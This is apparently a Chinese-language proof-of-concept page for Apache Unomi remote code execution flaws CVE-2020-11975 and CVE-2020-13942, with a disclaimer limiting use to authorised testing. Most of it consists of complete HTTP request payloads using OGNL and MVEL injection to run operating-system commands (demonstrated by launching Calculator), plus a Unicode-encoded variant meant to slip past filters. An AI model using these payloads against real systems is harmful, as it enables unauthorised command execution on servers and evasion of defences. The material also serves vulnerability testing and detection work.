### 声明

此处提供的漏洞检测方法、文件等内容，均仅限于安全从业者在获得法律授权的情况下使用，目的是检测已授权的服务器的安全性。安全从业者务必遵守法律规定，禁止在没有得到授权的情况下做任何漏洞检测。

### 简介

* 参考链接
  * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13942
  * https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/
  * http://unomi.apache.org/
  * [漏洞分析 - Apache Unomi RCE 第1篇 OGNL注入(CVE-2020-11975) - 先知社区](https://xz.aliyun.com/t/8564)
  * [漏洞分析 - Apache Unomi RCE 第2篇 OGNL/MVEL注入(CVE-2020-13942) - 先知社区](https://xz.aliyun.com/t/8565)


#### CVE-2020-11975

##### PoC: CVE-2020-11975 OGNL Injection

(这个PoC只支持检测版本 <= 1.5.0 , 建议使用后面CVE-2020-13942的2个PoC 支持检测版本 <= 1.5.1 )
```
POST /context.json HTTP/1.1
Host: localhost:8181
Connection: close
Content-Length: 749

{
  "personalizations":[
    {
      "id":"gender-test_anystr",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"))",
                  "comparisonOperator":"equals_anystr",
                  "propertyValue":"male_anystr"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"test-demo-session-id"
} 
```

#### CVE-2020-13942

##### PoC: HTTP request with OGNL injection

以下(PoC)HTTP请求中的OGNL表达式, 得到了`Runtime`并使用Java reflection API执行了一条OS命令.

```
POST /context.json HTTP/1.1
Host: localhost:8181
Connection: close
Content-Length: 1143

{
  "personalizations":[
    {
      "id":"gender-test_anystr",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2_anystr"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^  #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male_anystr"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"test-demo-session-id"
} 
```


变形: 可以做Unicode编码, 将payload中的字符变为`\uXXXX`格式. 同样可以成功.
```
// 如
// 把e替换为了\u0065
// 把.替换为了\u002e
(#runtim\u0065class = #this.getClass().forNam\u0065(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^  #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invok\u0065(null,null)).(#execmethod = #runtimeclass.getDeclar\u0065dMethods().{? #this.nam\u0065.\u0065quals(\"\u0065xec\")}.{? #this.g\u0065tParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod\u002einvok\u0065(#rtobj,\"/bin/bash -c $*|bash 0 /System/Applications/Calculator.app/Cont\u0065nts/MacOS/Calculator\"))
```




------


##### PoC: HTTP request with MVEL injection

以下(PoC)HTTP请求中的MVEL表达式创建了一个Runtime对象并运行OS命令.
```
POST /context.json HTTP/1.1
Host: localhost:8181
Connection: close
Content-Length: 564

{
    "filters": [
        {
            "id": "myfilter1_anystr",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "test-demo-session-id_anystr"
}
```
变形: 可以做Unicode编码, 将payload中的字符变为`\uXXXX`格式. 同样可以成功.
